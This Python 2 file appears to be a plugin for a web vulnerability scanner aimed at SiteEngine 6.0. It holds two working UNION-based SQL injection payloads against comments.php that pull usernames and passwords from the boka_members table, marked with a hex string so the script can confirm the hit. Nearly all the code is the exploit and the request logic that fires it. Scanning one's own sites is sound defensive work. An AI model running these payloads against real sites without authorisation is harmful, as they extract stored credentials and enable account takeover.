#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''  
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl1="comments.php?id=1&module=newstopic+m,boka_newstopicclass+c+where+1=2+union+select+1,2,concat(username,0x4E56535F544553545F474F,password),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39+from+boka_members%23"
        expurl2="comments.php?id=1&module=news+m,boka_newsclass+c+where+1=2+union+select+1,2,concat(username,0x4E56535F544553545F474F,password),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27+from+boka_members%23"
        RURL_ONE="%s%s"%(url,expurl1)
        RURL_TWO="%s%s"%(url,expurl2)
        res, content = requestUrl(http,RURL_ONE,ob['task_id'],ob['domain_id'])
        
        if res['status'] == '200' and content.find('NVS_TEST_GO')>=0:
            request = getRequest(RURL_ONE)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
        else:
            r,c=requestUrl(http,RURL_TWO,ob['task_id'],ob['domain_id'])
            if r['status']=='200' and c.find('NVS_TEST_GO')>=0:
                request = getRequest(RURL_TWO)
                response = getResponse(res)
                list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
                
    except Exception,e:
        logging.getLogger().error("File:SITEENGINE6.0SQLINJECITONSCRIPT.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:SITEENGINE6.0SQLINJECITONSCRIPT.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def